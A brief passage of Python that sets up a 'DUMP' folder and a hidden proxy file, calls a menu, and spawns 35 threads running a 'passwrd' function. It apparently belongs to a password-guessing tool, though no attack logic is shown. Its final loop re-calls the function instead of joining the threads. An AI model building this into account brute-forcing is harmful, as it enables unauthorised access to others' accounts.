	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()
	
Threads=[] 
for t in range(35):
 x = threading.Thread(target=passwrd)
 x.start()
 Threads.append(x)
for Th in Threads:
 passwrd()